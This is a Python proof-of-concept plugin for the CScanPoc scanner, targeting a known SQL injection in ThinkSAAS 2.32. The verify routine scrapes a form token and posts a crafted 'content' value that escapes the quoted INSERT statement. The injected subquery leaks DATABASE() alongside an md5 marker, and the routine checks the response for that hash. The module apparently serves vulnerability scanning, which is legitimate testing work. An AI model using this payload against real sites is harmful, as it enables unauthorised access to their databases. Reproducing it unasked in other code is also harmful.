# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'ThinkSAAS_0001_L'  # 平台漏洞编号
    name = 'ThinkSAAS 2.32 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        ThinkSAAS开源社区基于PHP+MySQL开发完成，运行于Linux 平台和Windows平台，完美支持Apache和Nginx运行环境。
        app\group\action\do.php 281行
        post变量全局做了转义，$content = tsClean($_POST['content']);这行去除了转义，导致可绕过单引号限制。
        tsClean除去转义后做了一些过滤，但不影响注入。
        $_POST['content']变成$content并带入sql语句。
        新建小组，发布帖子，访问http://127.0.0.1/thinksaas/index.php?app=group&ac=topic&id=1 （id为小组帖子的id）
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3316/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkSAAS'  # 漏洞组件名称
    product_version = '2.32'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ea23d9ee-9d97-46ab-ad26-3bf1f5c326fc'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户，新建小组，发布帖子，访问http://127.0.0.1/thinksaas/index.php?app=group&ac=topic&id=1 （id为小组帖子的id）
            s = requests.session()
            group_id = 1
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            r = s.get(
                self.target + '/index.php?app=group&ac=topic&id={group_id}'.format(group_id=group_id))
            # 获取token
            p = re.compile(
                r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
            if p.findall(r.text):
                token = p.findall(r.text)[0]

                url = self.target + '/index.php?app=group&ac=do&ts=recomment'
                data = "token={token}&referid=1&topicid={group_id1}&content=\:',11),('22',{group_id2},'1',(select concat((DATABASE()),char(45),(md5(c)))),11),(1,{group_id3},3,'".format(
                    token=token, group_id1=group_id, group_id2=group_id, group_id3=group_id)

                r = s.post(url, data=data)
                if "4a8a08f09d37b73795649038408b5f33" in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
